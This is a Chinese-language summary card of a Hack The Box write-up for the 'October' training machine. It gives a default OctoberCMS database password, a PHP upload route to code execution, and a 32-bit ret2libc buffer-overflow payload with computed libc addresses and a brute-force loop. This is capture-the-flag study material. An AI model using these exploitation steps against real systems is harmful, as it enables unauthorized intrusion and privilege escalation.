---
title: "[HTB] October Writeup"
category: web
tags: ["Hack The Box - October", "web", "october_cms", "php_cms_upload_bypass", "mysql_default_password", "su_buffer_overflow_ovrflw"]
signals: ["Hack The Box - October 2017", "october_cms", "php_cms_upload_bypass", "mysql_default_password", "su_buffer_overflow_ovrflw", "system_exit_binsh_brute", "ret2libc_i386", "brute_libc_base", "cms_credentials_config", "rce", "HTB", "October", "OctoberCMS", "RCE"]
difficulty: medium
source: "https://www.ctfiot.com/50413.html"
tools: ["PHP"]
origin: des-import
origin_kind: cards
updated: 2026-10-24
---
# [HTB] October Writeup

> 赛事：Hack The Box - October 2017 | 方向：web | 难度：medium | 工具：PHP

## 一句话总结

HTB October: OctoberCMS 数据库默认密码 + RCE 写 PHP 提权 → su 切换 → 32 位 ovrflw 栈溢出 (无 Canary/PIE) → brute libc base → ret2libc system(/bin/sh) 反弹 root。

## 攻击链

1. October CMS 1.0.412 searchsploit → /config/database.php 默认密码 OctoberCMSPassword!! + october 用户 → RCE php 上传 → get www-data → su → /usr/local/bin/ovrflw (32 位 NX+Partial RELRO+无 Canary+无 PIE) 栈溢出 112 字节 → brute libc base 0xb75f8000 → payload = b'A'*112 + p32(system)+p32(exit)+p32(binsh) → bash 反弹

## 关键 payload

```
mysql password: OctoberCMSPassword!! / checksec Canary:✘ NX:✓ PIE:✘ / system@b75f8000+0x40310=0xB7638310 / exit@b75f8000+0x33260=0xB762B260 / /bin/sh=b75f8000+0x162bac=0xB775ABAC
```

## 经验教训

CMS 默认密码 OctoberCMSPassword!! + config/database.php 路径暴露是 2017 老牌 CMS 经典；栈溢出 brute libc base 用 while true; do ovrflw "$payload"; done 是无 ASLR/PIE 时代的标配。

## 标签

october_cms、php_cms_upload_bypass、mysql_default_password、su_buffer_overflow_ovrflw、system_exit_binsh_brute、ret2libc_i386、brute_libc_base、cms_credentials_config、rce_php_file_upload

## 参考来源

- https://www.ctfiot.com/50413.html
- 原文件：[HTB]_October_Writeup.full.md
